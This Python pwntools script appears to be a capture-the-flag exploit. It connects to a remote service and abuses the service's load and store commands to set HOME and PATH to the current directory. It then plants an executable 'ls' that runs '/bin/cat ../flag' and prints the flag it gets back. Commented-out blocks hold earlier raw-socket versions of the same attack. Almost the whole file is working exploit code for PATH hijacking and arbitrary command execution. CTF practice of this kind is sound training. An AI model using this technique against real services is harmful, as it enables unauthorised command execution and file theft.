import socket
from sys import argv
from pwn import *

def command(r, com, variable, value):
    context.log_level = "error"
    #print "This is the second",r.recvuntil(":")
    r.sendline(com)
    r.sendline(variable)
    if value == 0:
        return 0
    else:
        r.sendline(value)
        return 0

def whattheenv(IPaddr, port):

        context.log_level = "error"

	r = remote(IPaddr, int(port))
        #print "This is the first", 
        #r.recvuntil(":")
        command(r,"load","HOME",".")
        command(r,"load","PATH",".")
        command(r,"load","ls","/bin/cat ../flag") 
        command(r,"load","permissions","0777")
        command(r,"store","permissions",0)
        command(r,"store","ls",0)
        #r.recvuntil(":")
        r.sendline("quit")
        output = r.recvall()
        if "FLAG" in output:
            pos = output.find("FLAG")
            print output[pos:]
        else:
            "No flag received"
        '''
        output = r.recv(1024)
        ID = output[-9:]
        r.recvuntil(":")
        r.send("load\n")
        r.recvuntil(":")
        r.send("HOME\n")
        r.recvuntil(":")
        r.send(".\n")
        r.recvuntil(":")
        r.send("load\n")
        r.recvuntil(":")
        r.send("PATH\n")
        r.recvuntil(":")
        r.send(".\n")
        r.recvuntil(":")
        r.send("load\n")
        r.recvuntil(":")
        r.send("ls\n")
        r.recvuntil(":")
        r.send("/bin/cat ../flag\n")
        r.recvuntil(":")
        r.send("load\n")
        r.recvuntil(":")
        r.send("permissions\n")
        r.recvuntil(":")
        r.send("0777\n")
        r.recvuntil(":")
        r.send("store\n") 
        r.recvuntil(":")
        r.send("permissions\n")
        r.recvuntil(":")
        r.send("store\n")
        r.recvuntil(":")
        r.send("ls\n")
        r.recvuntil(":")
        r.send("quit\n")
        output = r.recvall()
        if "FLAG" in output:
            print output
        else:
            print "No flag"
        '''
        '''
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((IPaddr, int(port)))

        #os.environ["HOME"] = "/"
	#print os.environ["HOME"]
	count = 0
	ID = ""
	#print os.environ['HOME']
	while 1:
		#count = 0
		print count
		output = s.recv(1024)

		#print ID
		if "ID" in output:
			print output
			#pos = output.find("id")
			data = output[-9:]
			ID += data
		elif "load" in output:
			print output
			#if count == 0 or count == 1:
			if count == 0:
				count += 1
				print "load1"
				s.sendall("load"+'\n')
			elif count == 1:
				count += 1
				print "load2"
				s.sendall("load"+'\n')
			elif count == 2:
				print "store1"
				count += 1
				s.sendall("store"+'\n')
			elif count == 3:
				print "store2"
				count += 1
				s.sendall("store"+'\n')
			#elif count == 4:
			#	s.sendall("quit"+'\n')	
		elif "variable" in output:
			print output
			if count == 1:
				print "HOME"
				s.sendall("HOME"+'\n')
			elif count == 2:
				print "PATH1"
				s.sendall("PATH"+'\n')
			elif count == 3:
				print "PATH2"
				s.sendall("HOME"+'\n')
			elif count == 4:
				s.sendall(""+'\n')
		elif "value" in output:
			print output
			if count == 1:
				print "1 "+ID
				s.sendall(ID+'\n')
			elif count == 2:
				print "2 "+ID
				s.sendall("bin/ls"+'\n')
			elif count == 3:
				s.sendall("/home/team23/"+ID+'\n')
		elif "Unknown" in output:
			count = count - 1
		#elif "FLAG" in output:
		#	print output
		#	break
		elif not output:
			break
		else:
	        	print output
            '''
whattheenv(argv[1], argv[2])

